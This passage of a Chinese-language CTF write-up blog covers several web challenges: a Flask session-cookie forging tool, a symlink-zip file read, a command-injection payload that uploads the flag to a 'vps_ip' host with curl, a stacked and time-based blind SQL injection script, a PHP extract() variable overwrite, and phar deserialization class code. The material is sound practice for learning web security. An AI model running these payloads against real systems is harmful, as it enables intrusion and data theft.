payload[1:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">"."</span>)[0]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">return</span> s.loads(session_cookie_value)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                <span class="built_in">return</span> <span class="string">"[Decoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                raise e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># Args are only relevant for __main__ usage</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">## Description for help</span></span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">                description=<span class="string">'Flask Session Cookie Decoder/Encoder'</span>,</span><br><span class="line">                epilog=<span class="string">"Author : Wilson Sumanang, Alexandre ZANNI"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## prepare sub commands</span></span><br><span class="line">    subparsers = parser.add_subparsers(<span class="built_in">help</span>=<span class="string">'sub-command help'</span>, dest=<span class="string">'subcommand'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the encode command</span></span><br><span class="line">    parser_encode = subparsers.add_parser(<span class="string">'encode'</span>, <span class="built_in">help</span>=<span class="string">'encode'</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">'-s'</span>, <span class="string">'--secret-key'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">'Secret key'</span>, required=True)</span><br><span class="line">    parser_encode.add_argument(<span class="string">'-t'</span>, <span class="string">'--cookie-structure'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">'Session cookie structure'</span>, required=True)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the decode command</span></span><br><span class="line">    parser_decode = subparsers.add_parser(<span class="string">'decode'</span>, <span class="built_in">help</span>=<span class="string">'decode'</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">'-s'</span>, <span class="string">'--secret-key'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">'Secret key'</span>, required=False)</span><br><span class="line">    parser_decode.add_argument(<span class="string">'-c'</span>, <span class="string">'--cookie-value'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">'Session cookie value'</span>, required=True)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## get args</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment">## find the option chosen</span></span><br><span class="line">    <span class="keyword">if</span>(args.subcommand == <span class="string">'encode'</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key is not None and args.cookie_structure is not None):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.encode(args.secret_key, args.cookie_structure))</span><br><span class="line">    <span class="keyword">elif</span>(args.subcommand == <span class="string">'decode'</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key is not None and args.cookie_value is not None):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.decode(args.cookie_value,args.secret_key))</span><br><span class="line">        <span class="keyword">elif</span>(args.cookie_value is not None):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.decode(args.cookie_value))</span><br></pre></td></tr></table></figure></p>
<p>用法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">解密:python flask_session_manager.py decode -c -s <span class="comment"># -c是flask cookie里的session值 -s参数是SECRET_KEY</span></span><br><span class="line">加密:python flask_session_manager.py encode -s -t <span class="comment"># -s参数是SECRET_KEY -t参数是session的参照格式，也就是session解密后的格式</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://uploader.shimo.im/f/DUAYU9L4kXcPb8hV.png!thumbnail" alt><br>把id改为1<br><img src="https://uploader.shimo.im/f/O41Pa517aAE3rcMA.png!thumbnail" alt><br>改下session再去访问upload<br>eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTIzIiwidXNlcm5hbWUiOiJhZG1pbiJ9.XhrKDg.SLL7JmZeSFo_GQCn2iLWZc14pmU<br><img src="https://uploader.shimo.im/f/c8aquoI0iloshq7d.png!thumbnail" alt><br>f12出源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">'/upload'</span>,methods=[<span class="string">'GET'</span>,<span class="string">'POST'</span>])</span><br><span class="line">def upload():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'id'</span>] != b<span class="string">'1'</span>:</span><br><span class="line">        <span class="built_in">return</span> render_template_string(temp)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">'POST'</span>:</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        name = session[<span class="string">'password'</span>]</span><br><span class="line">        name = name+<span class="string">'qweqweqwe'</span></span><br><span class="line">        name = name.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        m.update(name)</span><br><span class="line">        md5_one= m.hexdigest()</span><br><span class="line">        n = hashlib.md5()</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        ip = ip.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        n.update(ip)</span><br><span class="line">        md5_ip = n.hexdigest()</span><br><span class="line">        f=request.files[<span class="string">'file'</span>]</span><br><span class="line">        basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span>+md5_one+<span class="string">'/'</span>+session[<span class="string">'username'</span>]+<span class="string">"/"</span></span><br><span class="line">        path_base = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span></span><br><span class="line">        filename = f.filename</span><br><span class="line">        pathname = path+filename</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"zip"</span> != filename.split(<span class="string">'.'</span>)[-1]:</span><br><span class="line">            <span class="built_in">return</span> <span class="string">'zip only allowed'</span></span><br><span class="line">        <span class="keyword">if</span> not os.path.exists(path_base):</span><br><span class="line">            try:</span><br><span class="line">                os.makedirs(path_base)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                <span class="built_in">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> not os.path.exists(path):</span><br><span class="line">            try:</span><br><span class="line">                os.makedirs(path)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                <span class="built_in">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> not os.path.exists(pathname):</span><br><span class="line">            try:</span><br><span class="line">                f.save(pathname)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                <span class="built_in">return</span> <span class="string">'error'</span></span><br><span class="line">        try:</span><br><span class="line">            cmd = <span class="string">"unzip -n -d "</span>+path+<span class="string">" "</span>+ pathname</span><br><span class="line">            <span class="keyword">if</span> cmd.find(<span class="string">'|'</span>) != -1 or cmd.find(<span class="string">';'</span>) != -1:</span><br><span class="line">				waf()</span><br><span class="line">                <span class="built_in">return</span> <span class="string">'error'</span></span><br><span class="line">            os.system(cmd)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            <span class="built_in">return</span> <span class="string">'error'</span></span><br><span class="line">        unzip_file = zipfile.ZipFile(pathname,<span class="string">'r'</span>)</span><br><span class="line">        unzip_filename = unzip_file.namelist()[0]</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">'is_login'</span>] != True:</span><br><span class="line">            <span class="built_in">return</span> <span class="string">'not login'</span></span><br><span class="line">        try:</span><br><span class="line">            <span class="keyword">if</span> unzip_filename.find(<span class="string">'/'</span>) != -1:</span><br><span class="line">                shutil.rmtree(path_base)</span><br><span class="line">                os.mkdir(path_base)</span><br><span class="line">                <span class="built_in">return</span> <span class="string">'error'</span></span><br><span class="line">            image = open(path+unzip_filename, <span class="string">"rb"</span>).<span class="built_in">read</span>()</span><br><span class="line">            resp = make_response(image)</span><br><span class="line">            resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">            <span class="built_in">return</span> resp</span><br><span class="line">        except Exception as e:</span><br><span class="line">            shutil.rmtree(path_base)</span><br><span class="line">            os.mkdir(path_base)</span><br><span class="line">            <span class="built_in">return</span> <span class="string">'error'</span></span><br><span class="line">    <span class="built_in">return</span> render_template(<span class="string">'upload.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/showflag'</span>)</span><br><span class="line">def showflag():</span><br><span class="line">    <span class="keyword">if</span> True == False:</span><br><span class="line">        image = open(os.path.join(<span class="string">'./flag/flag.jpg'</span>), <span class="string">"rb"</span>).<span class="built_in">read</span>()</span><br><span class="line">        resp = make_response(image)</span><br><span class="line">        resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">        <span class="built_in">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> <span class="string">"can't give you"</span></span><br></pre></td></tr></table></figure></p>
<h3 id="使用软链接完成文件读取"><a href="#使用软链接完成文件读取" class="headerlink" title="使用软链接完成文件读取"></a>使用软链接完成文件读取</h3><p>上传一个软链接压缩包，完成flag读取。因为缺少flag的绝对路径，只有相对于flask工作目录的相对路径./flag/flag.jpg，所以要先获取<br>flask的工作目录。<br>在linux中，/proc/self/cwd/会指向进程的当前目录，那么在不知道flask工作目录时，我们可以用/proc/self/cwd/flag/flag.jpg来访问<br>flag.jpg，exp如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /proc/self/cwd/flag/flag.jpg exp</span><br><span class="line">zip -ry exp.zip exp  <span class="comment"># -y可以保存软连接压缩</span></span><br></pre></td></tr></table></figure></p>
<p>图片加载失败，抓个包flag就出来了<br><img src="https://uploader.shimo.im/f/5RTSeSDlGRwtwDX9.png!thumbnail" alt></p>
<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(sky=`awk <span class="string">'BEGIN&#123;printf "%c\n",47&#125;'</span>`&amp;&amp;curl vps_ip:23333 -T `cat .<span class="variable">$&#123;sky&#125;</span>flag<span class="variable">$&#123;sky&#125;</span>flag.jpg`)</span><br></pre></td></tr></table></figure>
<p>但是不行，在bp里 printf之后断开了后面的内容传不上去，我用$IFS连接也没用</p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>在username处加个’报错，两个’正常，猜测存在sql注入，题目提示PDO,猜测可能是用堆叠查询。因为PDO默认支持多语句查询，如果php版本小<br>于5.5.21或者创建PDO实例时未设置PDO::MYSQL_ATTR_MULTI_STATEMENTS为false时可能会造成堆叠注入。<br>引号中输入;，发现没有500错误，说明支持堆叠查询。使用PDO执行SQL语句时，可以执行多语句，不过这样通常不能直接得到注入结果，因为PDO<br>只会返回第一条SQL语句执行的结果，所以第二条语句中可以用update更新数据或者使用时间盲注获取数据<a href="https://xz.aliyun.com/t/3950#toc-2" target="_blank" rel="noopener">PDO下堆叠查询</a><br>但是过滤了select,if,sleep等一系列关键字，用十六进制+mysql预处理来完成绕过。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#select sleep(10)</span></span><br><span class="line"><span class="string">'1'</span>;<span class="built_in">set</span> @a=0x73656c65637420736c65657028313029;PREPARE stmt1 FROM @a;EXECUTE stmt1;-- <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">set @a=0x73656c65637420736c65657028313029</span></span><br><span class="line"><span class="string">设置一个变量</span></span><br><span class="line"><span class="string">PREPARE stmt1 FROM @a</span></span><br><span class="line"><span class="string">预定义一个语句，并将它赋给stmt1，值为@a变量值</span></span><br><span class="line"><span class="string">EXECUTE stmt1</span></span><br><span class="line"><span class="string">执行stmt1，如果 stmt1 不存在，将会引发一个错误。</span></span><br></pre></td></tr></table></figure></p>
<p>测试成功<br>附上别的师傅的时间盲注脚本<br>因为师傅的脚本报错了，转hex部分有问题，我做了修改<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://75aeec92-830a-48a7-94fd-35d83d17d71d.node3.buuoj.cn/index.php?r=Login/Login'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">pos = 1</span><br><span class="line">def str_to_hex(s):</span><br><span class="line">    <span class="built_in">return</span> <span class="string">''</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(32,127):</span><br><span class="line">        j=32</span><br><span class="line">        try:</span><br><span class="line">            <span class="comment">#flag</span></span><br><span class="line">            <span class="comment">#exp = "select if(ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,sleep(4),1)" % (pos, i)</span></span><br><span class="line">            <span class="comment">#flag</span></span><br><span class="line">            <span class="comment">#exp = "select if(ascii(substring((select group_concat(column_name) from information_schema.columns where table_name='flag'),%d,1))=%d,sleep(4),1)" % (pos, i)</span></span><br><span class="line">            <span class="comment">#glzjin_wants_a_girl_friend.zip</span></span><br><span class="line">            exp = <span class="string">"select if(ascii(substring((select flag from flag limit 0,1),%d,1))=%d,sleep(4),1)"</span> % (pos, i)</span><br><span class="line">            exp1 = <span class="string">"0x"</span>+str(str_to_hex(exp))</span><br><span class="line">            data = <span class="string">''</span><span class="string">'&#123;"username":"1'</span>;<span class="built_in">set</span> @a=%s;PREPARE stmt1 FROM @a;EXECUTE stmt1;-- <span class="string">","</span>password<span class="string">":"</span>a<span class="string">"&#125;''' % (exp1)</span></span><br><span class="line"><span class="string">            res = requests.post(url=url, data=data,  timeout=4)</span></span><br><span class="line"><span class="string">        except:</span></span><br><span class="line"><span class="string">            flag += chr(i)</span></span><br><span class="line"><span class="string">            print flag</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            print i</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">    pos += 1</span></span><br></pre></td></tr></table></figure></p>
<p>python 字符转hex<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def str_to_hex(s):</span><br><span class="line">    <span class="built_in">return</span> <span class="string">' '</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line">def hex_to_str(s):</span><br><span class="line">    <span class="built_in">return</span> <span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> [int(b, 16) <span class="keyword">for</span> b <span class="keyword">in</span> s.split(<span class="string">' '</span>)]])</span><br><span class="line"></span><br><span class="line">def str_to_bin(s):</span><br><span class="line">    <span class="built_in">return</span> <span class="string">' '</span>.join([bin(ord(c)).replace(<span class="string">'0b'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line">def bin_to_str(s):</span><br><span class="line">    <span class="built_in">return</span> <span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> [int(b, 2) <span class="keyword">for</span> b <span class="keyword">in</span> s.split(<span class="string">' '</span>)]])</span><br></pre></td></tr></table></figure></p>
<p>接下来是审计源码，先看控制器，可以看到BaseController.php中有一段很明显的代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> loadView(<span class="variable">$viewName</span> =<span class="string">''</span>, <span class="variable">$viewData</span> = [])</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$this</span>-&gt;viewPath = BASE_PATH . <span class="string">"/View/&#123;<span class="variable">$viewName</span>&#125;.php"</span>;</span><br><span class="line">		<span class="keyword">if</span>(file_exists(<span class="variable">$this</span>-&gt;viewPath))</span><br><span class="line">		&#123;</span><br><span class="line">			extract(<span class="variable">$viewData</span>);</span><br><span class="line">			include <span class="variable">$this</span>-&gt;viewPath;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>含有extract函数和include函数，全局搜索一下都在哪里调用了loadView<br><img src="https://uploader.shimo.im/f/JZZ3GcLPyrk9cueG.png!thumbnail" alt><br>跟进<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> actionIndex()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$listData</span> = <span class="variable">$_REQUEST</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;loadView(<span class="string">'userIndex'</span>,<span class="variable">$listData</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>这里listdata是可控的，userindex是包含的文件，看一下userindex.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$img_file</span>)) &#123;</span><br><span class="line">                    <span class="variable">$img_file</span> = <span class="string">'/../favicon.ico'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$img_dir</span> = dirname(__FILE__) . <span class="variable">$img_file</span>;</span><br><span class="line">                <span class="variable">$img_base64</span> = imgToBase64(<span class="variable">$img_dir</span>);</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">'&lt;img src="'</span> . <span class="variable">$img_base64</span> . <span class="string">'"&gt;'</span>;       //图片形式展示</span><br></pre></td></tr></table></figure></p>
<p>其中imgToBase64()实现的是将目标文件转化成base64格式。只需要将$img_file改成/flag.php即可<br>$listData = $_REQUEST;接收img_file=/../flag.php，extract($viewData);覆盖img_file，然后输出flag.php的base64编码</p>
<h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>简单看下有两个功能，上传文件，查看文件，f12源码提示flag在f1ag.php，在查看文件处url?file=很可疑，试了下存在文件包含<br>读到关键代码如下<br>file.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$show</span> = new Show();  </span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="variable">$file</span>)) &#123;  </span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="built_in">source</span> = <span class="variable">$file</span>;  </span><br><span class="line">    <span class="variable">$show</span>-&gt;_show();  </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!empty(<span class="variable">$file</span>))&#123;  </span><br><span class="line">    die(<span class="string">'file doesn\'</span>t exists.<span class="string">');  </span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>class.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">class C1e4r </span><br><span class="line">&#123; </span><br><span class="line">    public <span class="variable">$test</span>; </span><br><span class="line">    public <span class="variable">$str</span>; </span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$name</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$this</span>-&gt;str = <span class="variable">$name</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    public <span class="keyword">function</span> __destruct() </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$this</span>-&gt;<span class="built_in">test</span> = <span class="variable">$this</span>-&gt;str; </span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;<span class="built_in">test</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">class Show </span><br><span class="line">&#123; </span><br><span class="line">    public <span class="variable">$source</span>; </span><br><span class="line">    public <span class="variable">$str</span>; </span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$file</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$this</span>-&gt;<span class="built_in">source</span> = <span class="variable">$file</span>;   //<span class="variable">$this</span>-&gt;<span class="built_in">source</span> = phar://phar.jpg </span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;<span class="built_in">source</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    public <span class="keyword">function</span> __toString() </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$content</span> = <span class="variable">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;<span class="built_in">source</span>; </span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$content</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    public <span class="keyword">function</span> __set(<span class="variable">$key</span>,<span class="variable">$value</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    public <span class="keyword">function</span> _show() </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="variable">$this</span>-&gt;<span class="built_in">source</span>)) &#123; </span><br><span class="line">            die(<span class="string">'hacker!'</span>); </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            highlight_file(<span class="variable">$this</span>-&gt;<span class="built_in">source</span>); </span><br><span class="line">        &#125; </span><br><span class="line">         </span><br><span class="line">    &#125; </span><br><span class="line">    public <span class="keyword">function</span> __wakeup() </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="variable">$this</span>-&gt;<span class="built_in">source</span>)) &#123; </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"hacker~"</span>; </span><br><span class="line">            <span class="variable">$this</span>-&gt;<span class="built_in">source</span> = <span class="string">"index.php"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">class Test </span><br><span class="line">&#123; </span><br><span class="line">    public <span class="variable">$file</span>; </span><br><span class="line">    public <span class="variable">$params</span>; </span><br><span class="line">    public <span class="keyword">function</span> __construct() </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$this</span>-&gt;params = array(); </span><br><span class="line">    &#125; </span><br><span class="line">    public <span class="keyword">function</span> __get(<span class="variable">$key</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;get(<span class="variable">$key</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    public <span class="keyword">function</span> get(<span class="variable">$key</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123; </span><br><span class="line">            <span class="variable">$value</span> = <span class="variable">$this</span>-&gt;params[<span class="variable">$key</span>]; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="variable">$value</span> = <span class="string">"index.php"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;file_get(<span class="variable">$value</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    public <span class="keyword">function</span> file_get(<span class="variable">$value</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$value</span>)); </span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$text</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
